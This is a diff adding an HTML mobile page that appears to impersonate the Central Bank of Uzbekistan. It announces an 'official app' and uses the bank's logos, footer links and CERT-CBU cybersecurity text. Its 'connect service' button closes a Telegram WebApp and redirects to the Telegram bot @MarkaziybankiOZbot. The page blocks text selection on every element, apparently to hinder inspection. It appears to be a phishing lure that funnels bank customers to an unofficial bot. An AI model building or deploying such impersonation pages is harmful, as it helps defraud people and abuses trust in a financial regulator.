@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ЦБ запустил официальное приложение</title>
+  <link rel="icon" type="image/jpeg" href="лого1.jpg">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background: #f0f0f0;
+      margin: 0;
+      padding: 0;
+    }
+    .mobile-container {
+      width: 375px;
+      min-height: 100vh;
+      background-image: url('фон.jpg');
+      background-size: auto 100vh;
+      background-position: center center;
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+      position: relative;
+      overflow: auto;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+      
+      /* Запрещаем выделение текста */
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+      
+      /* Дополнительно для мобильных (запрет долгого нажатия) */
+      -webkit-touch-callout: none;
+      -webkit-tap-highlight-color: transparent;
+    }
+    /* Принудительно отключаем выделение у всех элементов */
+    * {
+      -webkit-user-select: none !important;
+      -moz-user-select: none !important;
+      -ms-user-select: none !important;
+      user-select: none !important;
+      -webkit-touch-callout: none !important;
+    }
+    /* Верхнее лого — на всю ширину и прижато к верху */
+    .top-logo {
+      width: 100%;
+      padding: 0;
+      margin: 0;
+      display: block;
+    }
+    .top-logo img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+  </style>
+</head>
+<body>
+  <div class="mobile-container text-black flex flex-col items-center">
+    <!-- Верхнее лого — растянуто на всю ширину, прижато к верху -->
+    <header class="top-logo">
+      <a href="https://cbu.uz/ru/">
+        <img src="лого.jpg" alt="Логотип ЦБ Узбекистана" class="w-full">
+      </a>
+    </header>
+
+    <main class="flex-1 flex flex-col items-center text-center bg-white bg-opacity-90 rounded-lg p-4 max-w-xs my-4 w-full px-4">
+      <h1 class="text-xl font-bold mt-4 mb-4">
+        ЦБ запустил приложение OR Markaziy Banki
+      </h1>
+      <img src="фото1.jpg" alt="Фото CERT-CBU" class="w-full max-w-xs mb-4 rounded-lg">
+      
+      <a id="connectButton" class="bg-blue-600 text-white font-semibold py-2 px-4 rounded-lg mb-4 hover:bg-blue-700 transition inline-block">
+        Подключить сервис
+      </a>
+
+      <p class="text-sm mb-4 text-left">
+        В целях оповещения о киберугрозах и инцидентах кибербезопасности, выявленных в деятельности важных объектов информационной инфраструктуры операторов платежных систем, кредитных и платежных организаций и их предотвращения, Центральным банком запущена “Информационная система оперативного оповещения, направленная на предупреждение инцидентов кибербезопасности в банковской сфере».
+      </p>
+      <p class="text-sm mb-4 text-left">
+        Сайт центра кибербезопасности Центрального банка «CERT-CBU» <a href="https://yuz.uz/ru/news/tsentralny-bank-uzbekistana-zapustil-sayt-tsentra-kiberbezopasnosti-cert-cbu" class="underline text-blue-600">cert.cbu.uz</a> состоит из следующих разделов:
+      </p>
+      <ul class="text-sm mb-4 text-left list-disc list-inside">
+        <li>Сообщить об инциденте – оповещение в Центр кибербезопасности ЦБ «CERT-CBU» об инцидентах кибербезопасности, наблюдаемых в банковской сфере;</li>
+        <li>Новости — статьи о важных новостях в сфере кибербезопасности, информация о наблюдаемых в мире инцидентах кибербезопасности;</li>
+        <li>База знаний - словарь, содержащий термины, относящиеся к области кибербезопасности, полезная информация по обеспечению кибербезопасности, проверка фальшивых ссылок, создаваемых с наименованием и торговой маркой операторов платежных систем, кредитных и платежных организаций в Республике Узбекистан.</li>
+      </ul>
+      <p class="text-sm mb-6 text-left">
+        Сайт <a href="https://cert.cbu.uz" class="underline text-blue-600">cert.cbu.uz</a> запущен в тестовом режиме и в дальнейшем будет пополнен новыми функциями и полезной информацией.
+      </p>
+      <hr class="w-full border-t border-gray-400 my-4">
+      <h2 class="text-lg font-semibold mb-4">Смотрите также:</h2>
+      <a href="https://cbu.uz/ru/press_center/news/2498666/" class="text-sm mb-2 text-left block">
+        Обеспечение гендерного равенства в банковско-финансовом секторе
+        <span class="block text-gray-400 text-xs">5 июня 2025</span>
+      </a>
+      <a href="https://cbu.uz/ru/press_center/news/2489362/" class="text-sm mb-4 text-left block">
+        Состоялся круглый стол с представителями коммерческих банков по вопросам состояния финансовой стабильности в Узбекистане
+        <span class="block text-gray-400 text-xs">4 июня 2025</span>
+      </a>
+    </main>
+
+    <footer class="text-center mb-4 w-full px-4">
+      <a href="https://cbu.uz/ru/">
+        <img src="лого.jpg" alt="Логотип ЦБ Узбекистана" class="w-[90%] max-w-[338px] mx-auto mb-2">
+      </a>
+      <div class="grid grid-cols-2 gap-4 text-sm text-black max-w-xs mb-4 mx-auto">
+        <div class="text-left">
+          <a href="https://cbu.uz/ru/search/" class="block mb-2 underline">Поиск по сайту</a>
+          <a href="https://cbu.uz/ru/map/" class="block mb-2 underline">Карта сайта</a>
+          <a href="https://cbu.uz/ru/services/open_data/" class="block mb-2 underline">Открытые данные</a>
+          <a href="https://cbu.uz/ru/anti-corruption/" class="block underline">Противодействие коррупции</a>
+        </div>
+        <div class="text-left">
+          <a href="https://cbu.uz/ru/credit-organizations/" class="block mb-2 underline">Кредитные организации</a>
+          <a href="https://cbu.uz/ru/banknotes-coins/commemorative-coins/" class="block mb-2 underline">Памятные монеты</a>
+          <a href="https://cbu.uz/ru/about/history/" class="block mb-2 underline">История банковской системы</a>
+          <a href="https://cbu.uz/ru/payment-systems/history/" class="block underline">История развития платежной системы</a>
+        </div>
+      </div>
+      <p class="text-xs text-gray-400">
+        © 2005–2025 Центральный банк Республики Узбекистан, официальный сайт.
+      </p>
+    </footer>
+  </div>
+
+  <!-- Telegram WebApp скрипт -->
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <script>
+    document.getElementById('connectButton').addEventListener('click', function(e) {
+      e.preventDefault();
+      if (window.Telegram && Telegram.WebApp) {
+        Telegram.WebApp.ready();
+        Telegram.WebApp.close();
+        setTimeout(function() {
+          if (document.visibilityState !== 'hidden') {
+            window.location.href = 'https://t.me/MarkaziybankiOZbot';
+          }
+        }, 1000);
+      } else {
+        window.location.href = 'https://t.me/MarkaziybankiOZbot';
+      }
+    });
+  </script>
+</body>
+</html>
